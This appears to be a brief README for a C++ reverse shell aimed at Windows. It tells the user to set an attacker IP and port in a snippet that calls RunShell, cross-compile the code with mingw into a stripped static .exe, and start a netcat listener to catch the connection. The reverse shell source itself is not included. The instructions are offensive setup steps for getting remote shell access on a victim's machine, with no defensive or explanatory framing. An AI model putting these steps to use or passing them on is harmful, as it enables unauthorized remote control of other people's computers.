# c++ reverse shell


#### 1. chnage The IP and Port number in the source code
![alt text](https://raw.githubusercontent.com/username/projectname/branch/path/to/img.png)
   
    70 else {
    71    char host[] = "192.168.0.101";  // change this to your ip address
    72    int port = 4444;                //chnage this to your open port
    73    RunShell(host, port);
    74}
    




#### 2. Complie it in lunix 
 
    i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc



#### 3. Start the netcat Listener.

    nc -lvnp <port number>
